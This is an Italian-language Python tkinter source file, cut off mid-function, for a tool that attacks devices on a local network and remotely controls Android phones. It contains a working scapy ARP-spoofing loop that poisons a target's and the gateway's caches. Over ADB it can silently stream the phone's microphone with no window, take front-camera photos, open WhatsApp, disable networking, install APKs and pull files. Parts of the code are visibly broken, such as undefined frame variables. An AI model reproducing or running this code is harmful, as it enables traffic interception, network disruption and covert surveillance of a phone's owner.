import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import threading
import socket
import re
import os
from datetime import datetime

BG      = "#0d1117"
SURFACE = "#161b22"
BORDER  = "#30363d"
ACCENT  = "#58a6ff"
GREEN   = "#3fb950"
YELLOW  = "#d29922"
RED     = "#f85149"
TEXT    = "#e6edf3"
MUTED   = "#8b949e"

blocked_threads = {}
SCRCPY_DIR  = os.path.join(os.path.expanduser("~"), "Desktop", "scrcpy-win64-v3.3.4")
SCRCPY_PATH = os.path.join(SCRCPY_DIR, "scrcpy.exe")
ADB_PATH    = os.path.join(SCRCPY_DIR, "adb.exe")

def get_gateway():
    try:
        out = subprocess.check_output("ipconfig", text=True)
        for line in out.splitlines():
            if "Gateway" in line or "gateway" in line:
                m = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                if m:
                    return m.group(1)
    except:
        pass
    return None

def arp_spoof_loop(target_ip, gateway_ip, stop_event):
    try:
        from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf, srp
        iface = conf.iface
        my_mac = get_if_hwaddr(iface)
        def resolve(ip):
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
            if ans:
                return ans[0][1].hwsrc
            return None
        target_mac  = resolve(target_ip)
        gateway_mac = resolve(gateway_ip)
        if not target_mac or not gateway_mac:
            return
        pkt_t = Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip,  hwsrc=my_mac)
        pkt_g = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,   hwsrc=my_mac)
        while not stop_event.is_set():
            sendp(pkt_t, iface=iface, verbose=0)
            sendp(pkt_g, iface=iface, verbose=0)
            stop_event.wait(1.5)
        r_t = Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip,  hwsrc=gateway_mac)
        r_g = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,   hwsrc=target_mac)
        for _ in range(5):
            sendp(r_t, iface=iface, verbose=0)
            sendp(r_g, iface=iface, verbose=0)
    except ImportError:
        pass

def get_adb_serial(ip):
    try:
        out = subprocess.check_output([ADB_PATH, "devices"], text=True, timeout=5)
        serials = []
        for line in out.splitlines():
            if "	device" in line and "offline" not in line:
                serial = line.split()[0]
                if ip in serial:
                    return serial
                serials.append(serial)
        # verifica via ip route su ogni serial
        for serial in serials:
            try:
                info = subprocess.check_output(
                    [ADB_PATH, "-s", serial, "shell", "ip addr"],
                    text=True, timeout=5)
                if ip in info:
                    return serial
            except:
                pass
    except:
        pass
    return None

def adb_cmd(ip, *args):
    serial = get_adb_serial(ip)
    if serial:
        subprocess.run([ADB_PATH, "-s", serial, "shell"] + list(args), capture_output=True)

def open_gestisci(ip):
    serial = get_adb_serial(ip)
    already_connected = serial is not None

    win = tk.Toplevel()
    win.title(f"GESTISCI — {ip}")
    win.configure(bg=BG)
    win.resizable(False, False)
    win.grab_set()

    tk.Label(win, text="GESTISCI", font=("Courier New", 16, "bold"),
             bg=BG, fg=ACCENT).pack(pady=(20, 4))
    tk.Label(win, text=f"Dispositivo: {ip}",
             font=("Courier New", 10), bg=BG, fg=MUTED).pack()

    tk.Frame(win, bg=BORDER, height=1).pack(fill="x", padx=24, pady=14)

    # ── sezione connessione (mostrata solo se non connesso) ──
    conn_frame = tk.Frame(win, bg=BG)

    if not already_connected:
        win.geometry("560x780")
        tk.Label(conn_frame, text="Sul telefono:\nImpostazioni → Opzioni sviluppatore\n→ Debug wireless → Abbina dispositivo con codice",
                 font=("Courier New", 9), bg=BG, fg=MUTED, justify="center").pack(pady=(0,10))

        form = tk.Frame(conn_frame, bg=BG)
        form.pack(padx=24, fill="x")

        tk.Label(form, text="IP:PORTA pairing", font=("Courier New", 9), bg=BG, fg=MUTED).grid(row=0, column=0, sticky="w", pady=4)
        pair_addr = tk.Entry(form, font=("Courier New", 10), bg=SURFACE, fg=TEXT, insertbackground=TEXT, relief="flat", bd=4, width=22)
        pair_addr.grid(row=0, column=1, padx=(8,0), pady=4)
        pair_addr.insert(0, f"{ip}:PORTA")

        tk.Label(form, text="Codice PIN", font=("Courier New", 9), bg=BG, fg=MUTED).grid(row=1, column=0, sticky="w", pady=4)
        pair_pin = tk.Entry(form, font=("Courier New", 10), bg=SURFACE, fg=TEXT, insertbackground=TEXT, relief="flat", bd=4, width=22)
        pair_pin.grid(row=1, column=1, padx=(8,0), pady=4)

        tk.Label(form, text="Porta connessione", font=("Courier New", 9), bg=BG, fg=MUTED).grid(row=2, column=0, sticky="w", pady=4)
        conn_port = tk.Entry(form, font=("Courier New", 10), bg=SURFACE, fg=TEXT, insertbackground=TEXT, relief="flat", bd=4, width=22)
        conn_port.grid(row=2, column=1, padx=(8,0), pady=4)
        conn_port.insert(0, "es: 42345")

        status_lbl = tk.Label(conn_frame, text="", font=("Courier New", 9), bg=BG, fg=MUTED)
        status_lbl.pack(pady=4)

        def do_pair():
            addr = pair_addr.get().strip()
            pin  = pair_pin.get().strip()
            if not addr or not pin:
                status_lbl.configure(text="Inserisci IP:PORTA e PIN", fg=RED)
                return
            status_lbl.configure(text="Pairing in corso...", fg=YELLOW)
            win.update()
            proc = subprocess.run([ADB_PATH, "pair", addr, pin], capture_output=True, text=True, timeout=15)
            out = proc.stdout + proc.stderr
            if "success" in out.lower():
                status_lbl.configure(text="Pairing OK! Ora clicca Connetti.", fg=GREEN)
            else:
                status_lbl.configure(text=f"Errore: {out.strip()[:80]}", fg=RED)

        def do_connect():
            porta = conn_port.get().strip().split(":")[-1] or "5555"
            status_lbl.configure(text="Connessione...", fg=YELLOW)
            win.update()
            proc = subprocess.run([ADB_PATH, "connect", f"{ip}:{porta}"], capture_output=True, text=True, timeout=10)
            out = proc.stdout + proc.stderr
            if "connected" in out.lower():
                status_lbl.configure(text="Connesso!", fg=GREEN)
                win.update()
                conn_frame.pack_forget()
                action_frame.pack(pady=10)
                win.geometry("560x680")
            else:
                status_lbl.configure(text=f"Errore: {out.strip()[:80]}", fg=RED)

        pair_btn_frame = tk.Frame(conn_frame, bg=BG)
        pair_btn_frame.pack(pady=8)
        tk.Button(pair_btn_frame, text="1. ABBINA", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=16, pady=7,
                  cursor="hand2", command=do_pair).pack(side="left", padx=6)
        tk.Button(pair_btn_frame, text="2. CONNETTI", font=("Courier New", 10, "bold"),
                  bg=GREEN, fg=BG, relief="flat", padx=16, pady=7,
                  cursor="hand2", command=do_connect).pack(side="left", padx=6)

        conn_frame.pack(fill="x")
    else:
        win.geometry("560x680")

    # ── sezione azioni (sempre visibile se già connesso) ──
    action_frame = tk.Frame(win, bg=BG)

    def do_watch():
        s = get_adb_serial(ip)
        if s:
            subprocess.Popen([SCRCPY_PATH, "-s", s, "--video-bit-rate", "4M",
                                     "--max-fps", "30", "--max-size", "800",
                                     "--keyboard=uhid", "--stay-awake"], cwd=SCRCPY_DIR)

    def do_info():
        s = get_adb_serial(ip)
        if not s:
            messagebox.showerror("Errore", "Dispositivo non connesso via adb.")
            return
        def get(cmd):
            r = subprocess.run([ADB_PATH, "-s", s, "shell"] + cmd,
                             capture_output=True, text=True)
            return r.stdout.strip()

        modello   = get(["getprop", "ro.product.model"])
        marca     = get(["getprop", "ro.product.manufacturer"])
        android   = get(["getprop", "ro.build.version.release"])
        sdk       = get(["getprop", "ro.build.version.sdk"])
        batteria  = get(["dumpsys", "battery"])
        ram_out   = get(["cat", "/proc/meminfo"])
        ip_int    = get(["ip", "route"])
        storage   = get(["df", "/sdcard"])
        seriale   = get(["getprop", "ro.serialno"])

        # parsing batteria
        bat_level = "?"
        bat_status = "?"
        bat_temp = "?"
        for line in batteria.splitlines():
            if "level:" in line: bat_level = line.split(":")[-1].strip() + "%"
            if "status:" in line:
                st = line.split(":")[-1].strip()
                bat_status = {"1":"Sconosciuto","2":"Ricarica","3":"Scarico","4":"Carico","5":"Completo"}.get(st, st)
            if "temperature:" in line:
                try: bat_temp = str(int(line.split(":")[-1].strip()) / 10) + "°C"
                except: pass

        # parsing RAM
        ram_total = ram_free = "?"
        for line in ram_out.splitlines():
            if "MemTotal:" in line: ram_total = line.split()[1] + " kB"
            if "MemAvailable:" in line: ram_free = line.split()[1] + " kB"

        # IP interno
        ip_interno = "?"
        import re as re2
        m = re2.search(r"src (\d+\.\d+\.\d+\.\d+)", ip_int)
        if m: ip_interno = m.group(1)

        info_win = tk.Toplevel(win)
        info_win.title(f"Info — {ip}")
        info_win.geometry("420x500")
        info_win.configure(bg=BG)

        tk.Label(info_win, text="INFO DISPOSITIVO",
                 font=("Courier New", 13, "bold"), bg=BG, fg=ACCENT).pack(pady=12)

        frame = tk.Frame(info_win, bg=SURFACE, padx=20, pady=16,
                         highlightthickness=1, highlightbackground=BORDER)
        frame.pack(fill="x", padx=16)

        def row(label, val, col=TEXT):
            f = tk.Frame(frame, bg=SURFACE)
            f.pack(fill="x", pady=3)
            tk.Label(f, text=label, font=("Courier New", 9), bg=SURFACE,
                     fg=MUTED, width=18, anchor="w").pack(side="left")
            tk.Label(f, text=val, font=("Courier New", 9, "bold"),
                     bg=SURFACE, fg=col, anchor="w").pack(side="left")

        row("Marca", marca)
        row("Modello", modello)
        row("Android", android + f" (SDK {sdk})")
        row("Seriale", seriale)
        row("IP interno", ip_interno, ACCENT)

        tk.Frame(info_win, bg=BORDER, height=1).pack(fill="x", padx=16, pady=8)

        bat_col = GREEN if int(bat_level.replace("%","") or 0) > 30 else YELLOW if int(bat_level.replace("%","") or 0) > 15 else RED
        frame2 = tk.Frame(info_win, bg=SURFACE, padx=20, pady=16,
                          highlightthickness=1, highlightbackground=BORDER)
        frame2.pack(fill="x", padx=16)

        def row2(label, val, col=TEXT):
            f = tk.Frame(frame2, bg=SURFACE)
            f.pack(fill="x", pady=3)
            tk.Label(f, text=label, font=("Courier New", 9), bg=SURFACE,
                     fg=MUTED, width=18, anchor="w").pack(side="left")
            tk.Label(f, text=val, font=("Courier New", 9, "bold"),
                     bg=SURFACE, fg=col, anchor="w").pack(side="left")

        row2("Batteria", bat_level, bat_col)
        row2("Stato", bat_status)
        row2("Temperatura", bat_temp)
        row2("RAM totale", ram_total)
        row2("RAM libera", ram_free)

        # monitor batteria live
        bat_live = tk.Label(info_win, text="",
                           font=("Courier New", 10, "bold"), bg=BG, fg=GREEN)
        bat_live.pack(pady=8)

        stop_bat = threading.Event()
        def monitor_bat():
            import time
            while not stop_bat.is_set():
                try:
                    b = subprocess.run([ADB_PATH, "-s", s, "shell",
                        "dumpsys battery | grep level"],
                        capture_output=True, text=True).stdout.strip()
                    lv = b.split(":")[-1].strip() if ":" in b else "?"
                    col = GREEN if int(lv or 0) > 30 else YELLOW if int(lv or 0) > 15 else RED
                    bat_live.configure(text=f"🔋 Batteria live: {lv}%", fg=col)
                except: pass
                time.sleep(10)
        threading.Thread(target=monitor_bat, daemon=True).start()
        info_win.protocol("WM_DELETE_WINDOW", lambda: [stop_bat.set(), info_win.destroy()])

        # screenshot
        def do_screenshot():
            from tkinter import filedialog
            dest = filedialog.askdirectory(title="Dove salvare screenshot?")
            if not dest: return
            import time
            ts = int(time.time())
            tmp = f"/sdcard/screenshot_{ts}.png"
            subprocess.run([ADB_PATH, "-s", s, "shell", "screencap", tmp], capture_output=True)
            subprocess.run([ADB_PATH, "-s", s, "pull", tmp, dest], capture_output=True)
            subprocess.run([ADB_PATH, "-s", s, "shell", "rm", tmp], capture_output=True)
            messagebox.showinfo("OK", f"Screenshot salvato in {dest}")

        tk.Button(info_win, text="📷  SCREENSHOT",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=GREEN, relief="flat", padx=16, pady=6,
                  cursor="hand2", command=do_screenshot).pack(pady=4)

        tk.Button(info_win, text="Chiudi", font=("Courier New", 10),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=lambda: [stop_bat.set(), info_win.destroy()]).pack()

    def is_screen_on():
        try:
            out = subprocess.check_output([ADB_PATH, "-s", get_adb_serial(ip), "shell",
                "dumpsys power | grep mWakefulness"], capture_output=False, text=True, timeout=5)
            return "Awake" in out
        except:
            return True

    def toggle_screen():
        if is_screen_on():
            adb_cmd(ip, "input", "keyevent", "KEYCODE_POWER")
            auto_clear("Schermo spento", MUTED)
            screen_btn.configure(text="☀  ACCENDI", fg=YELLOW)
        else:
            adb_cmd(ip, "input", "keyevent", "KEYCODE_WAKEUP")
            auto_clear("Schermo acceso", GREEN)
            screen_btn.configure(text="🌙  SPEGNI", fg=MUTED)

    tk.Label(action_frame, text="Azioni disponibili:",
             font=("Courier New", 9), bg=BG, fg=MUTED).pack(pady=(0,8))

    row1 = tk.Frame(action_frame, bg=BG)
    row1.pack()

    def do_4k():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        # apri fotocamera frontale
        subprocess.run([ADB_PATH, "-s", s, "shell",
            "am start -a android.media.action.STILL_IMAGE_CAMERA_SECURE "
            "--ei android.intent.extras.CAMERA_FACING 1"], capture_output=True)
        import time; time.sleep(1)
        # scatta foto
        subprocess.run([ADB_PATH, "-s", s, "shell",
            "input keyevent KEYCODE_CAMERA"], capture_output=True)
        auto_clear("Foto scattata!", GREEN)

    tk.Button(row1, text="👁  WATCH", font=("Courier New", 11, "bold"),
              bg=ACCENT, fg=BG, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_watch).pack(side="left", padx=6)

    tk.Button(row1, text="ℹ  INFO", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=ACCENT, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_info).pack(side="left", padx=6)

    tk.Button(row1, text="📸  4K", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=GREEN, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_4k).pack(side="left", padx=6)

    row2 = tk.Frame(action_frame, bg=BG)
    row2.pack(pady=(8,0))

    # microfono live
    mic_proc = [None]
    def do_mic():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        if mic_proc[0] is not None:
            mic_proc[0].terminate()
            mic_proc[0] = None
            mic_btn.configure(text="🎤  MICROFONO", fg=MUTED)
            auto_clear("Microfono disattivato", MUTED)
            return
        # registra audio dal mic del telefono e lo riproduce sul pc
        # usa scrcpy audio per sentire il microfono in tempo reale
        p = subprocess.Popen(
            [SCRCPY_PATH, "-s", s, "--no-video", "--audio-source=mic", "--no-window"],
            cwd=SCRCPY_DIR, creationflags=subprocess.CREATE_NO_WINDOW)
        mic_proc[0] = p
        mic_btn.configure(text="🎤  STOP MIC", fg=RED)
        auto_clear("Microfono attivo — senti in cuffia/casse", GREEN)

        def watch_mic():
            import time
            p.wait()
            mic_proc[0] = None
            mic_btn.configure(text="🎤  MICROFONO", fg=MUTED)
            auto_clear("Microfono fermato", MUTED)
        threading.Thread(target=watch_mic, daemon=True).start()

    def do_apri_wg():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        # accendi schermo se spento
        subprocess.run([ADB_PATH, "-s", s, "shell", "input keyevent KEYCODE_WAKEUP"], capture_output=True)
        import time; time.sleep(0.5)
        # sblocca swipe
        subprocess.run([ADB_PATH, "-s", s, "shell", "input swipe 540 1600 540 800"], capture_output=True)
        time.sleep(0.5)
        # prova WhatsApp
        r = subprocess.run([ADB_PATH, "-s", s, "shell",
            "monkey -p com.whatsapp 1"], capture_output=True, text=True)
        if "No activities found" in r.stdout or "error" in r.stdout.lower():
            subprocess.run([ADB_PATH, "-s", s, "shell",
                "am start -a android.intent.action.VIEW -d https://www.google.com"],
                capture_output=True)
            auto_clear("WhatsApp non trovato, aperto Google", YELLOW)
        else:
            auto_clear("WhatsApp aperto!", GREEN)


    mic_btn = tk.Button(row2, text="🎤  MICROFONO", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=MUTED, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_mic)
    mic_btn.pack(side="left", padx=6)



    tk.Button(row2, text="🏠  HOME", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=MUTED, relief="flat", padx=18, pady=8,
              cursor="hand2", command=lambda: [
                  subprocess.run([ADB_PATH, "-s", get_adb_serial(ip), "shell",
                      "input keyevent KEYCODE_HOME"], capture_output=True),
                  auto_clear("Tornato a Home", GREEN)
              ]).pack(side="left", padx=6)

    tk.Button(row2, text="💬  APRI W/G", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=ACCENT, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_apri_wg).pack(side="left", padx=6)

    schermo_iniziale = is_screen_on()
    screen_btn = tk.Button(row1,
              text="🌙  SPEGNI" if schermo_iniziale else "☀  ACCENDI",
              font=("Courier New", 11),
              bg=SURFACE, fg=MUTED if schermo_iniziale else YELLOW,
              relief="flat", padx=18, pady=8,
              cursor="hand2", command=toggle_screen)
    screen_btn.pack(side="left", padx=6)

    # thread che aggiorna il tasto in base allo stato reale del telefono
    stop_monitor = threading.Event()
    def monitor_screen():
        import time
        last = schermo_iniziale
        while not stop_monitor.is_set() and win.winfo_exists():
            try:
                current = is_screen_on()
                if current != last:
                    last = current
                    if current:
                        screen_btn.configure(text="🌙  SPEGNI", fg=MUTED)
                    else:
                        screen_btn.configure(text="☀  ACCENDI", fg=YELLOW)
            except:
                pass
            time.sleep(0.2)
    t = threading.Thread(target=monitor_screen, daemon=True)
    t.start()
    def on_close():
        stop_monitor.set()
        if mic_proc[0] is not None:
            mic_proc[0].terminate()
            mic_proc[0] = None
        win.destroy()
    win.protocol("WM_DELETE_WINDOW", on_close)

    # sezione messaggio
    msg_frame = tk.Frame(action_frame, bg=BG)
    msg_frame.pack(pady=(8,0), padx=24, fill="x")

    msg_entry = tk.Entry(msg_frame, font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                         insertbackground=TEXT, relief="flat", bd=4)
    msg_entry.pack(side="left", fill="x", expand=True, padx=(0,8))
    msg_entry.insert(0, "Scrivi messaggio...")
    msg_entry.bind("<FocusIn>", lambda e: msg_entry.delete(0, "end") if msg_entry.get() == "Scrivi messaggio..." else None)

    def do_msg():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        testo = msg_entry.get().strip()
        if not testo or testo == "Scrivi messaggio...":
            auto_clear("Scrivi un messaggio!", RED)
            return
        subprocess.run([ADB_PATH, "-s", s, "shell", "input keyevent KEYCODE_WAKEUP"], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f"am broadcast -a android.intent.action.BOOT_COMPLETED"], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'am start -n com.android.settings/.Settings'], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'service call notification 1 s16 "{testo}"'], capture_output=True)
        # toast via shell
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'am broadcast -a android.provider.Telephony.SMS_RECEIVED '
            f'--es "sms_body" "{testo}"'], capture_output=True)
        # metodo piu affidabile: overlay
        # crea pagina HTML con messaggio e aprila nel browser
        escaped_html = testo.replace("'", "\'").replace('"', '&quot;').replace('<', '&lt;')
        html = (
            f"data:text/html,<html><body style='background:%23111;display:flex;"
            f"align-items:center;justify-content:center;height:100vh;margin:0;'>"
            f"<div style='background:%23222;color:white;font-size:2em;padding:40px;"
            f"border-radius:20px;text-align:center;font-family:sans-serif;"
            f"box-shadow:0 0 40px %23000;max-width:80%25;'>{escaped_html}</div></body></html>"
        )
        subprocess.run([ADB_PATH, "-s", s, "shell", "input keyevent KEYCODE_WAKEUP"], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'am start -n com.android.chrome/com.google.android.apps.chrome.Main '
            f'-a android.intent.action.VIEW -d "{html}"'],
            capture_output=True)
        auto_clear(f"Messaggio inviato: {testo[:30]}", GREEN)

    tk.Button(msg_frame, text="INVIA", font=("Courier New", 10, "bold"),
              bg=GREEN, fg=BG, relief="flat", padx=12, pady=4,
              cursor="hand2", command=do_msg).pack(side="left")

    action_status = tk.Label(action_frame, text="", font=("Courier New", 9),
                             bg=BG, fg=MUTED)
    action_status.pack(pady=6)

    def clear_status():
        action_status.configure(text="")
    
    # pulisce status dopo 2 secondi
    def auto_clear(msg, color):
        action_status.configure(text=msg, fg=color)
        win.after(2000, clear_status)

    tk.Frame(action_frame, bg=BORDER, height=1).pack(fill="x", padx=24, pady=(12,6))

    def open_avanzate():
        s = get_adb_serial(ip)
        if not s:
            messagebox.showerror("Errore", "Dispositivo non connesso.")
            return
        aw = tk.Toplevel()
        aw.title(f"AVANZATE — {ip}")
        aw.geometry("620x560")
        aw.configure(bg=BG)
        aw.resizable(True, True)
        canvas = tk.Canvas(aw, bg=BG, highlightthickness=0)
        vsb = ttk.Scrollbar(aw, orient="vertical", command=canvas.yview)
        sf = tk.Frame(canvas, bg=BG)
        sf.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0,0), window=sf, anchor="nw")
        canvas.configure(yscrollcommand=vsb.set)
        canvas.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")
        aw.bind("<MouseWheel>", lambda e: canvas.yview_scroll(int(-1*(e.delta/120)), "units"))
        tk.Label(sf, text="AVANZATE", font=("Courier New", 16, "bold"), bg=BG, fg=RED).pack(pady=(16,2))
        tk.Label(sf, text=f"Dispositivo: {ip}", font=("Courier New", 10), bg=BG, fg=MUTED).pack()
        tk.Frame(sf, bg=BORDER, height=1).pack(fill="x", padx=24, pady=10)
        astatus = tk.Label(sf, text="", font=("Courier New", 9), bg=BG, fg=MUTED)
        def run(*cmd):
            subprocess.run([ADB_PATH, "-s", s, "shell"] + list(cmd), capture_output=True)
        def qrun(cmd_list, msg, color=GREEN):
            subprocess.run([ADB_PATH, "-s", s, "shell"] + cmd_list, capture_output=True)
            astatus.configure(text=msg, fg=color)
        # connettivita
        tk.Label(sf, text="CONNETTIVITA", font=("Courier New", 8, "bold"), bg=BG, fg=MUTED).pack(pady=(4,0))
        r1 = tk.Frame(sf, bg=BG); r1.pack(pady=4)
        wifi_on = [True]
        def toggle_wifi():
            run("svc wifi disable" if wifi_on[0] else "svc wifi enable")
            wifi_on[0] = not wifi_on[0]
            wb.configure(text="WIFI ON" if not wifi_on[0] else "WIFI OFF", fg=GREEN if not wifi_on[0] else RED)
            astatus.configure(text=f"WiFi {'off' if not wifi_on[0] else 'on'}", fg=MUTED)
        dati_on = [True]
        def toggle_dati():
            run("svc data disable" if dati_on[0] else "svc data enable")
            dati_on[0] = not dati_on[0]
            db.configure(text="DATI ON" if not dati_on[0] else "DATI OFF", fg=GREEN if not dati_on[0] else RED)
            astatus.configure(text=f"Dati {'off' if not dati_on[0] else 'on'}", fg=MUTED)
        aereo_on = [False]
        def toggle_aereo():
            val = "1" if not aereo_on[0] else "0"
            run(f"settings put global airplane_mode_on {val}")
            run("am broadcast -a android.intent.action.AIRPLANE_MODE")
            aereo_on[0] = not aereo_on[0]
            aeb.configure(text="AEREO OFF" if aereo_on[0] else "AEREO ON", fg=RED if aereo_on[0] else MUTED)
            astatus.configure(text=f"Aereo {'on' if aereo_on[0] else 'off'}", fg=MUTED)
        wb = tk.Button(r1, text="WIFI OFF", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2", command=toggle_wifi)
        wb.pack(side="left", padx=4)
        db = tk.Button(r1, text="DATI OFF", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2", command=toggle_dati)
        db.pack(side="left", padx=4)
        aeb = tk.Button(r1, text="AEREO ON", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2", command=toggle_aereo)
        aeb.pack(side="left", padx=4)
        # volume e luce
        tk.Button(r2, text="VOL ZERO", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["cmd", "media_session", "volume", "--set", "0"], "Volume zero!")).pack(side="left", padx=4)
        tk.Button(r2, text="LUCE MAX", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["settings", "put", "system", "screen_brightness", "255"], "Luminosita massima!")).pack(side="left", padx=4)
        tk.Button(r2, text="LUCE MIN", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: [run("settings", "put", "system", "screen_brightness_mode", "0"),
                                   qrun(["settings", "put", "system", "screen_brightness", "1"], "Luminosita minima!")]).pack(side="left", padx=4)
        # sistema
        tk.Button(r3, text="CHIUDI PLAY", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["am", "force-stop", "com.android.vending"], "Play Store chiuso!")).pack(side="left", padx=4)
        tk.Button(r3, text="CHIUDI CHROME", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["am", "force-stop", "com.android.chrome"], "Chrome chiuso!")).pack(side="left", padx=4)
        tk.Button(r3, text="CACHE", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["pm", "trim-caches", "1000000000"], "Cache pulita!")).pack(side="left", padx=4)
        # sveglia

        tk.Button(sf, text="Chiudi", font=("Courier New", 10),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=aw.destroy).pack(pady=(0,16))
        astatus.pack(pady=4)

    tk.Button(action_frame, text="⚡  AVANZATE", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=RED, relief="flat", padx=20, pady=8,
              cursor="hand2", command=open_avanzate).pack(pady=4)

    # ── TRASFERISCI ──
    tk.Frame(action_frame, bg=BORDER, height=1).pack(fill="x", padx=24, pady=(10,6))
    tk.Label(action_frame, text="FILE E APP",
             font=("Courier New", 8, "bold"), bg=BG, fg=MUTED).pack()

    trasf_row = tk.Frame(action_frame, bg=BG)
    trasf_row.pack(pady=4)

    def invia_file():
        from tkinter import filedialog
        s = get_adb_serial(ip)
        if not s:
            messagebox.showerror("Errore", "Dispositivo non connesso via adb.")
            return
        path = filedialog.askopenfilename(title="Seleziona file da inviare")
        if not path:
            return
        import os
        nome = os.path.basename(path)
        r = subprocess.run([ADB_PATH, "-s", s, "push", path, f"/sdcard/Download/{nome}"],
                          capture_output=True, text=True)
        if r.returncode == 0:
            messagebox.showinfo("OK", f"File inviato in /sdcard/Download/{nome}")
        else:
            messagebox.showerror("Errore", r.stderr.strip()[:100])

    def ricevi_file():
        from tkinter import filedialog
        s = get_adb_serial(ip)
        if not s:
            messagebox.showerror("Errore", "Dispositivo non connesso via adb.")
            return
        win2 = tk.Toplevel(win)
        win2.title("File sul telefono")
        win2.geometry("500x400")
        win2.configure(bg=BG)
        win2.grab_set()

        tk.Label(win2, text="/sdcard/Download/",
                 font=("Courier New", 10, "bold"), bg=BG, fg=ACCENT).pack(pady=10)

        listbox = tk.Listbox(win2, font=("Courier New", 10), bg=SURFACE,
                             fg=TEXT, relief="flat", selectbackground=BORDER)
        listbox.pack(fill="both", expand=True, padx=16, pady=6)

        out = subprocess.run([ADB_PATH, "-s", s, "shell", "ls", "/sdcard/Download/"],
                            capture_output=True, text=True).stdout
        for f in [x.strip() for x in out.splitlines() if x.strip()]:
            listbox.insert("end", f)

        def scarica():
            sel = listbox.curselection()
            if not sel: return
            nome = listbox.get(sel[0])
            dest = filedialog.askdirectory(title="Dove salvare?")
            if not dest: return
            r = subprocess.run([ADB_PATH, "-s", s, "pull",
                               f"/sdcard/Download/{nome}", dest],
                              capture_output=True, text=True)
            if r.returncode == 0:
                messagebox.showinfo("OK", f"Salvato in {dest}")
                win2.destroy()
            else:
                messagebox.showerror("Errore", r.stderr.strip()[:100])

        tk.Button(win2, text="SCARICA", font=("Courier New", 10, "bold"),
                  bg=GREEN, fg=BG, relief="flat", padx=16, pady=6,
                  cursor="hand2", command=scarica).pack(pady=6)

    def installa_apk():
        from tkinter import filedialog
        s = get_adb_serial(ip)
        if not s:
            messagebox.showerror("Errore", "Dispositivo non connesso via adb.")
            return
        path = filedialog.askopenfilename(
            title="Seleziona APK",
            filetypes=[("APK", "*.apk"), ("Tutti", "*.*")])
        if not path: return
        r = subprocess.run([ADB_PATH, "-s", s, "install", "-r", path],
                          capture_output=True, text=True)
        if "Success" in r.stdout:
            messagebox.showinfo("OK", "APK installata!")
        else:
            messagebox.showerror("Errore", (r.stdout + r.stderr).strip()[:150])

    def gestisci_app():
        s = get_adb_serial(ip)
        if not s:
            messagebox.showerror("Errore", "Dispositivo non connesso via adb.")
            return
        win3 = tk.Toplevel(win)
        win3.title("App installate")
        win3.geometry("500x500")
        win3.configure(bg=BG)
        win3.grab_set()

        tk.Label(win3, text="APP INSTALLATE",
                 font=("Courier New", 12, "bold"), bg=BG, fg=ACCENT).pack(pady=10)

        search_var = tk.StringVar()
        tk.Entry(win3, textvariable=search_var,
                 font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                 insertbackground=TEXT, relief="flat", bd=4).pack(fill="x", padx=16)

        listbox = tk.Listbox(win3, font=("Courier New", 9), bg=SURFACE,
                             fg=TEXT, relief="flat", selectbackground=BORDER)
